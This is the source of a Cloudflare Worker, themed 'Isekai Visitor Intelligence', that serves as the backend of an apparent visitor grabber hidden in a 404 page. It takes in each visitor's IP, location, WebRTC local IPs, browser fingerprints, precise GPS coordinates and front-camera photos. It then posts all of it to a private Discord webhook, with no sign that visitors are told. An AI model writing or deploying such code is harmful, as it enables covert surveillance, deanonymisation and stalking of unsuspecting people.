/**
 * Cloudflare Worker — りっかちゃん ✦ Isekai Visitor Intelligence
 * Sinkron dengan payload 404.html (instant / enriched / GPS / kamera / anime)
 */

const CORS = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type",
};

// ── Tema sakura / wa ─────────────────────────────────────
const COLORS = {
  instant: 0xffb7d5,   // sakura pink
  enriched: 0xe85d8a,  // deep rose
  gps: 0x7ec8e3,       // sky blue
  gpsError: 0xb0b0b0,  // ash gray
  camera: 0xff9ecd,    // peach blossom
  anime: 0xc9a0dc,     // wisteria
};

const FOOTER = "りっかちゃん ✦ 異世界ビジター ✦ Isekai Visitor Intelligence ✦ v3";

// ── Helpers ──────────────────────────────────────────────

function s(v, max = 220) {
  if (v == null || v === "" || v === "null" || v === undefined) return "—";
  return String(v).replace(/[\x00-\x1F\x7F]/g, " ").trim().slice(0, max);
}

function boolJa(v) {
  if (v === true || v === "true") return "✅ はい / Yes";
  if (v === false || v === "false") return "❌ いいえ / No";
  return "—";
}

function arr(v) {
  if (!v || !Array.isArray(v) || v.length === 0) return "—";
  return v.join(", ").slice(0, 200) || "—";
}

function waktuWIB() {
  try {
    return new Date().toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      day: "2-digit",
      month: "long",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    });
  } catch (_) {
    return new Date().toISOString();
  }
}

function parseBrands(brandsJson) {
  try {
    return JSON.parse(brandsJson).map((b) => `${b.brand} ${b.version}`).join(", ");
  } catch (_) {
    return s(brandsJson);
  }
}

function parseFullVersions(json) {
  try {
    return JSON.parse(json).map((b) => `${b.brand} ${b.version}`).join(", ");
  } catch (_) {
    return s(json);
  }
}

const SPACER = { name: "\u200B", value: "━━━━━━━━━━━━━━━━━━━━", inline: false };

function sectionHeader(ja, en) {
  return { name: `🌸 ${ja}  ·  ${en}`, value: "⠀", inline: false };
}

function linkField(url, labelJa = "ページを開く", labelEn = "Open page") {
  if (!url) return "—";
  return `[🔗 ${labelJa} / ${labelEn}](${url})\n\`${s(url, 160)}\``;
}

function identityBlock(data) {
  return [
    `**🆔 Visitor ID:** \`${s(data.visitorId, 32)}\``,
    `**📋 Session:** \`${s(data.reportSessionId, 40)}\``,
    `**📱 端末 / Device:** ${s(data.deviceName)}${data.deviceModel ? ` · \`${s(data.deviceModel, 60)}\`` : ""}`,
    `**🌐 ブラウザ / Browser:** ${s(data.browserName)}${data.browserVersion ? ` \`${s(data.browserVersion, 24)}\`` : ""}`,
    `**💿 OS:** ${s(data.osName)}${data.osVersion ? ` \`${s(data.osVersion, 24)}\`` : ""}`,
  ].join("\n");
}

function pageBlock(data) {
  const lines = [];
  if (data.pageTitle) lines.push(`**📄 タイトル / Title:** ${s(data.pageTitle, 100)}`);
  if (data.hostname) lines.push(`**🏠 Host:** \`${s(data.hostname)}\`${data.pathname ? `\`${s(data.pathname, 80)}\`` : ""}`);
  const utm = ["utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content"]
    .filter((k) => data[k])
    .map((k) => `\`${k}\`=${s(data[k], 40)}`);
  if (utm.length) lines.push(`**📣 UTM:** ${utm.join(" · ")}`);
  return lines.length ? lines.join("\n") : "—";
}

function networkBlock(data) {
  const lines = [
    `**IP:** \`${s(data.ip)}\``,
    `**ISP / Org:** ${s(data.isp)}`,
    `**📍 都市 / City:** ${s(data.city)} · ${s(data.region)} · ${s(data.country)}`,
  ];
  if (data.ipLat != null && data.ipLon != null) {
    lines.push(`**🗺️ IP Geo:** \`${data.ipLat}, ${data.ipLon}\` · [Maps](https://maps.google.com/?q=${data.ipLat},${data.ipLon})`);
  }
  lines.push(
    `**ASN:** ${s(data.asn)} · **Proxy:** ${boolJa(data.proxy)} · **Hosting:** ${boolJa(data.hosting)}`,
  );
  if (data.localIPs) lines.push(`**🔌 Local IP (WebRTC):** \`${s(data.localIPs, 120)}\``);
  return lines.join("\n");
}

function connectionBlock(data) {
  return [
    `**タイプ / Type:** ${s(data.connectionType)} · **Effective:** ${s(data.effectiveConnection)}`,
    `**Downlink:** ${s(data.downlink)} Mbps · **RTT:** ${s(data.rtt)} ms`,
    `**データ節約 / Save Data:** ${boolJa(data.saveData)} · **Online:** ${boolJa(data.online)}`,
  ].join("\n");
}

function deviceBlock(data) {
  return [
    `**CPU:** \`${s(data.hardwareConcurrency)} core\` · **RAM:** \`${s(data.deviceMemory)} GB\``,
    `**GPU:** ${s(data.vendor)} · **Renderer:** ${s(data.renderer, 100)}`,
    `**WebGL:** ${s(data.version, 50)} · **WebGPU:** ${boolJa(data.webgpu)} · **Touch:** ${s(data.maxTouchPoints)}`,
    data.formFactor ? `**Form Factor:** ${s(data.formFactor)}` : null,
    data.wow64 != null ? `**WoW64:** ${boolJa(data.wow64)}` : null,
  ].filter(Boolean).join("\n");
}

function screenBlock(data) {
  return [
    `**解像度 / Resolution:** \`${s(data.width)} × ${s(data.height)}\` · **DPR:** \`${s(data.pixelRatio)}x\``,
    `**Available:** \`${s(data.availWidth)} × ${s(data.availHeight)}\` · **Depth:** \`${s(data.colorDepth)} bit\``,
    `**Viewport:** \`${s(data.innerWidth)} × ${s(data.innerHeight)}\` · **Orientation:** ${s(data.orientation)}`,
    `**🌙 Dark Mode:** ${boolJa(data.darkMode)} · **Motion Reduce:** ${boolJa(data.reducedMotion)}`,
  ].join("\n");
}

function photoMetaBlock(data) {
  const m = data.photoMeta;
  if (!m || typeof m !== "object") return null;
  const lines = [
    m.deviceLabel ? `**📷 Device:** ${s(m.deviceLabel, 80)}` : null,
    m.facingMode ? `**Facing:** \`${s(m.facingMode)}\`` : null,
    m.frameRate != null ? `**Frame rate:** \`${s(m.frameRate)} fps\`` : null,
    m.sourceWidth != null && m.sourceHeight != null
      ? `**Sensor / Source:** \`${s(m.sourceWidth)} × ${s(m.sourceHeight)}\``
      : null,
    m.outputWidth != null && m.outputHeight != null
      ? `**Output JPEG:** \`${s(m.outputWidth)} × ${s(m.outputHeight)}\` · Q \`${s(m.jpegQuality)}\``
      : null,
    m.aspectRatio ? `**Aspect:** \`${s(m.aspectRatio)}\`` : null,
    m.zoom != null ? `**Zoom:** \`${s(m.zoom)}x\`` : null,
    m.gpsLat != null && m.gpsLon != null
      ? `**📍 GPS (EXIF):** \`${m.gpsLat}, ${m.gpsLon}\`${m.gpsAccuracy != null ? ` · ±${Math.round(m.gpsAccuracy)} m` : ""}${m.gpsQuality ? ` · ${s(m.gpsQuality)}` : ""}`
      : null,
    m.capWidthMax != null
      ? `**Max resolution:** \`${s(m.capWidthMax)} × ${s(m.capHeightMax)}\` · **FPS max:** \`${s(m.capFrameRateMax)}\``
      : null,
  ].filter(Boolean);
  if (!lines.length) return null;
  return lines.join("\n");
}

function localeBlock(data) {
  return [
    `**言語 / Language:** ${s(data.language)} · ${s(data.languages, 80)}`,
    `**Timezone:** ${s(data.timezone)} · **Calendar:** ${s(data.calendar)} · **Currency:** ${s(data.currency)}`,
    data.numberingSystem ? `**Numbering:** ${s(data.numberingSystem)}` : null,
  ].filter(Boolean).join("\n");
}

function fingerprintBlock(data) {
  const lines = [
    `**🎵 Audio FP:** \`${s(data.audioFingerprint, 64)}\``,
    `**🎨 Canvas FP:** \`${s(data.canvasFingerprint, 64)}\``,
  ];
  if (data.detectedFonts) {
    lines.push(`**🔤 Fonts (${s(data.fontCount)}):** ${s(data.detectedFonts, 150)}`);
  }
  return lines.join("\n");
}

function storageBlock(data) {
  return [
    `**LocalStorage:** ${boolJa(data.localStorage)} · **Session:** ${boolJa(data.sessionStorage)} · **IndexedDB:** ${boolJa(data.indexedDB)}`,
    `**ServiceWorker:** ${boolJa(data.serviceWorker)} · **Cache API:** ${boolJa(data.cacheAPI)} · **Cookies:** ${s(data.cookies)}`,
    `**Cookie Enabled:** ${boolJa(data.cookieEnabled)} · **DNT:** ${s(data.doNotTrack)}`,
  ].join("\n");
}

function mediaDevicesBlock(data) {
  return [
    `**🎙️ Mic:** ${arr(data.audioIn)}`,
    `**📷 Cam (detected):** ${arr(data.videoIn)}`,
    `**🔊 Speaker:** ${arr(data.audioOut)}`,
  ].join("\n");
}

function capabilitiesBlock(data) {
  return [
    `**WebGL2:** ${boolJa(data.webgl2)} · **WebRTC:** ${boolJa(data.webrtc)} · **Fetch:** ${boolJa(data.fetchAPI)}`,
    `**CSS Grid:** ${boolJa(data.cssGrid)} · **Flexbox:** ${boolJa(data.flexbox)} · **Promise:** ${boolJa(data.promise)}`,
    data.plugins ? `**Plugins:** ${s(data.plugins, 120)}` : null,
  ].filter(Boolean).join("\n");
}

function systemBlock(data) {
  const browserLine = data.brands
    ? parseBrands(data.brands)
    : `${s(data.browserName)} ${s(data.browserVersion)}`.trim();
  return [
    `**Platform:** ${s(data.platform)} · **Mobile:** ${boolJa(data.mobile)}`,
    data.platformName ? `**UA Platform:** ${s(data.platformName)} ${s(data.platformVersion)}` : null,
    `**Model (UA):** ${s(data.model)} · **Arch:** ${s(data.architecture)}${s(data.bitness) !== "—" ? ` (${s(data.bitness)}-bit)` : ""}`,
    `**Brands:** ${browserLine || "—"}`,
    data.fullVersionList ? `**Full Versions:** ${parseFullVersions(data.fullVersionList)}` : null,
  ].filter(Boolean).join("\n");
}

function batteryBlock(data) {
  if (data.level == null && data.charging == null) return null;
  return [
    `**🔋 Level:** ${s(data.level)} · **Charging:** ${boolJa(data.charging)}`,
  ].join("\n");
}

function buildBaseFields(data, opts = {}) {
  const { includeBattery = true, includeMedia = true, includeFingerprint = true } = opts;
  const fields = [
    sectionHeader("来訪者情報", "Visitor Identity"),
    { name: "👤 Identity", value: identityBlock(data), inline: false },
    sectionHeader("ページ情報", "Page Info"),
    { name: "🔗 Page", value: linkField(data.url), inline: false },
    { name: "🪄 Referrer", value: data.referrer ? linkField(data.referrer, "参照元", "Referrer") : "*直接アクセス / Direct visit*", inline: false },
  ];
  if (pageBlock(data) !== "—") {
    fields.push({ name: "📄 Meta", value: pageBlock(data), inline: false });
  }
  fields.push(
    SPACER,
    sectionHeader("ネットワーク", "Network"),
    { name: "🌐 IP & Geo", value: networkBlock(data), inline: false },
    { name: "📡 Connection", value: connectionBlock(data), inline: false },
    SPACER,
    sectionHeader("デバイス", "Device"),
    { name: "💻 Hardware", value: deviceBlock(data), inline: false },
    { name: "🖥️ Display", value: screenBlock(data), inline: false },
  );
  const batt = includeBattery ? batteryBlock(data) : null;
  if (batt) fields.push({ name: "🔋 Battery", value: batt, inline: false });
  fields.push(
    SPACER,
    sectionHeader("システム", "System"),
    { name: "🗂️ Platform", value: systemBlock(data), inline: false },
    { name: "🌏 Locale", value: localeBlock(data), inline: false },
  );
  if (includeFingerprint) {
    fields.push(
      SPACER,
      sectionHeader("フィンガープリント", "Fingerprint"),
      { name: "🔐 FP", value: fingerprintBlock(data), inline: false },
    );
  }
  fields.push(
    SPACER,
    sectionHeader("ストレージ", "Storage"),
    { name: "💾 Browser Storage", value: storageBlock(data), inline: false },
  );
  if (includeMedia) {
    fields.push({ name: "🎙️ Media Devices", value: mediaDevicesBlock(data), inline: false });
  }
  fields.push(
    SPACER,
    sectionHeader("ブラウザ能力", "Capabilities"),
    { name: "🧩 Features", value: capabilitiesBlock(data), inline: false },
    { name: "📋 User Agent", value: `\`\`\`\n${s(data.userAgent, 250)}\n\`\`\``, inline: false },
  );
  return fields.slice(0, 25);
}

function embedShell(color, title, subtitleJa, subtitleEn, fields) {
  return {
    color,
    title,
    description: [
      `> *${subtitleJa}*`,
      `> *${subtitleEn}*`,
      "> ─────────────────────────",
      `> ⏰ **Waktu / Time:** ${waktuWIB()}`,
    ].join("\n"),
    fields,
    footer: { text: FOOTER },
    timestamp: new Date().toISOString(),
  };
}

// ── Instant (kirim segera, tanpa tunggu GPS/kamera) ─────

function buildInstantEmbed(data) {
  return embedShell(
    COLORS.instant,
    "🌸 桜 · クイックスキャン  ·  Quick Scan",
    "来訪者を検知 — 基本データを送信しました。",
    "Visitor detected — basic telemetry sent immediately.",
    buildBaseFields(data, { includeBattery: false, includeMedia: false, includeFingerprint: true }),
  );
}

// ── Enriched (data lengkap setelah async selesai) ────────

function buildEnrichedEmbed(data) {
  const partialNote = data._enrichedPartial
    ? "\n> ⚠️ *部分データ / Partial enrichment*"
    : "";
  const embed = embedShell(
    COLORS.enriched,
    "✦ 異世界来訪者レポート  ·  Isekai Visitor Report",
    "データ収集完了 — 詳細プロファイル。",
    "Full collection complete — detailed visitor profile.",
    buildBaseFields(data),
  );
  if (partialNote) embed.description += partialNote;
  return embed;
}

// ── GPS (pesan terpisah saat izin lokasi) ────────────────

function buildGpsEmbed(data) {
  const mapsUrl = `https://maps.google.com/?q=${data.lat},${data.lon}`;
  const quality = data.gpsQuality || (data.accuracy <= 20 ? "high" : data.accuracy <= 100 ? "medium" : "low");
  const qualityLabel = { high: "🟢 高精度 / High", medium: "🟡 中精度 / Medium", low: "🔴 低精度 / Low" }[quality] || quality;

  return embedShell(
    COLORS.gps,
    "📍 位置情報取得  ·  Location Access Granted",
    "来訪者が位置情報を許可しました。",
    "Visitor granted geolocation permission.",
    [
      sectionHeader("GPS座標", "GPS Coordinates"),
      {
        name: "🗺️ Coordinates",
        value: [
          `**緯度 / Lat:** \`${data.lat}\``,
          `**経度 / Lon:** \`${data.lon}\``,
          `**精度 / Accuracy:** ± ${data.accuracy != null ? Math.round(data.accuracy) + " m" : "—"}`,
          `**品質 / Quality:** ${qualityLabel}`,
          data.altitude != null ? `**高度 / Altitude:** ${Math.round(data.altitude)} m` : null,
          data.speed != null ? `**速度 / Speed:** ${data.speed} m/s` : null,
          data.heading != null ? `**方向 / Heading:** ${data.heading}°` : null,
          "",
          `[🗺️ Google Maps / 地図を開く](${mapsUrl})`,
        ].filter((x) => x !== null).join("\n"),
        inline: false,
      },
      SPACER,
      { name: "👤 Visitor", value: identityBlock(data), inline: false },
      { name: "🔗 Page", value: linkField(data.url), inline: false },
    ],
  );
}

function buildGpsErrorEmbed(data) {
  const codeMap = {
    1: "PERMISSION_DENIED / 拒否されました",
    2: "POSITION_UNAVAILABLE / 位置不明",
    3: "TIMEOUT / タイムアウト",
    LOW_ACCURACY: "LOW_ACCURACY / 精度不足",
    ABORT: "ABORT / 中断",
  };
  const code = data.gpsErrorCode;
  const codeText = codeMap[code] || s(code);

  return embedShell(
    COLORS.gpsError,
    "🚫 位置情報 — アクセス不可  ·  Location Unavailable",
    "位置情報は取得できませんでした。",
    "Could not obtain geolocation from this visitor.",
    [
      { name: "⚠️ Status", value: `**Code:** \`${codeText}\`${data.accuracy != null ? `\n**Last accuracy:** ± ${Math.round(data.accuracy)} m` : ""}`, inline: false },
      { name: "👤 Visitor", value: identityBlock(data), inline: false },
      { name: "🔗 Page", value: linkField(data.url), inline: false },
    ],
  );
}

// ── Kamera (pesan terpisah + lampiran foto) ──────────────

function buildCameraEmbed(data) {
  const photoBlock = photoMetaBlock(data);
  const fields = [
    sectionHeader("キャプチャ情報", "Capture Info"),
    {
      name: "📷 Photo",
      value: [
        `**Capture ID:** \`${s(data.captureId, 48)}\``,
        data.captureTs ? `**Timestamp:** \`${new Date(data.captureTs).toISOString()}\`` : null,
        "*画像は添付ファイル / Image attached below*",
        photoBlock ? "*EXIF embedded in JPEG attachment*" : null,
      ].filter(Boolean).join("\n"),
      inline: false,
    },
  ];
  if (photoBlock) {
    fields.push({
      name: "🧾 Photo Metadata",
      value: photoBlock,
      inline: false,
    });
  }
  fields.push(
    SPACER,
    { name: "👤 Visitor", value: identityBlock(data), inline: false },
    { name: "🖥️ Display", value: screenBlock(data), inline: false },
    { name: "🔗 Page", value: linkField(data.url), inline: false },
  );
  return embedShell(
    COLORS.camera,
    "📸 カメラキャプチャ  ·  Front Camera Capture",
    "来訪者がカメラアクセスを許可 — 写真を取得しました。",
    "Visitor granted camera access — photo captured.",
    fields,
  );
}

// ── Anime view (event terpisah) ──────────────────────────

function buildAnimeEmbed(data) {
  const malLink = data.malUrl || (data.animeId ? `https://myanimelist.net/anime/${data.animeId}` : null);
  return embedShell(
    COLORS.anime,
    "🎬 アニメ閲覧  ·  Anime View",
    "来訪者がアニメ詳細を閲覧しました。",
    "Visitor opened an anime detail page.",
    [
      {
        name: "📺 Title",
        value: [
          `**${s(data.animeTitle, 120)}**`,
          data.animeId ? `**MAL ID:** \`${data.animeId}\`` : null,
          data.animeScore != null ? `**⭐ Score:** ${data.animeScore}` : null,
          data.animeType ? `**Type:** ${s(data.animeType)}` : null,
          malLink ? `[🔗 MyAnimeList](${malLink})` : null,
        ].filter(Boolean).join("\n"),
        inline: false,
      },
      { name: "👤 Visitor", value: identityBlock(data), inline: false },
      { name: "🔗 Page", value: linkField(data.url), inline: false },
    ],
  );
}

// ── Router & Discord POST ────────────────────────────────

function resolveMessage(data) {
  if (data._cameraCapture) {
    return data.imageBase64
      ? { embed: buildCameraEmbed(data), imageBase64: data.imageBase64 }
      : { embed: buildCameraEmbed(data) };
  }
  if (data._gpsOnly && data._gpsError) {
    return { embed: buildGpsErrorEmbed(data) };
  }
  if (data._gpsOnly && data.lat != null && data.lon != null) {
    return { embed: buildGpsEmbed(data) };
  }
  if (data._animeView) {
    return { embed: buildAnimeEmbed(data) };
  }
  if (data._instant) {
    return { embed: buildInstantEmbed(data) };
  }
  if (data._enriched) {
    return { embed: buildEnrichedEmbed(data) };
  }
  return { embed: buildEnrichedEmbed(data) };
}

function base64ToBytes(b64) {
  const raw = b64.includes(",") ? b64.split(",")[1] : b64;
  const bin = atob(raw);
  const bytes = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  return bytes;
}

async function postToDiscord(webhook, message) {
  const { embed, imageBase64 } = message;

  if (imageBase64) {
    const bytes = base64ToBytes(imageBase64);
    const form = new FormData();
    form.append(
      "payload_json",
      JSON.stringify({ embeds: [{ ...embed, image: { url: "attachment://capture.jpg" } }] }),
    );
    form.append("files[0]", new Blob([bytes], { type: "image/jpeg" }), "capture.jpg");
    await fetch(webhook, { method: "POST", body: form });
    return;
  }

  await fetch(webhook, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ embeds: [embed] }),
  });
}

// ── Handler ──────────────────────────────────────────────

export default {
  async fetch(request, env) {
    if (request.method === "OPTIONS") {
      return new Response(null, { status: 204, headers: CORS });
    }
    if (request.method !== "POST") {
      return new Response("Not Found", { status: 404, headers: CORS });
    }

    let data;
    try {
      data = await request.json();
    } catch {
      return new Response("Bad JSON", { status: 400, headers: CORS });
    }

    const webhook = env.DISCORD_WEBHOOK_URL;
    if (!webhook) {
      return new Response("OK", { status: 200, headers: CORS });
    }

    try {
      const message = resolveMessage(data);
      await postToDiscord(webhook, message);
    } catch (e) {
      console.error(e);
    }

    return new Response("OK", {
      status: 200,
      headers: {
        ...CORS,
        "Cache-Control": "no-store",
      },
    });
  },
};
